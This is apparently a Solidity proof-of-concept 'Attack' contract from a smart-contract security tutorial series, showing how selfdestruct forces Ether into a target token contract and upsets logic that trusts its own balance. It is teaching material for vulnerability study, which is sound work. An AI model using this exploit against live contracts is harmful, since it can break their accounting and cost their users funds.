// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//-------------------------------------------------------------------------------------//
// Copyright (c) 2022 - 2023 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//-------------------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-08-unexpected-ether-with-forcibly-sending-ether-e13be2c6b985
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-08-unexpected-ether-with-forcibly-sending-ether/

pragma solidity 0.8.17;

contract Attack {
    address immutable moonToken;

    constructor(address _moonToken) {
        moonToken = _moonToken;
    }

    function attack() external payable {
        require(msg.value != 0, "Require some Ether to attack");

        address payable target = payable(moonToken);
        selfdestruct(target);
    }
}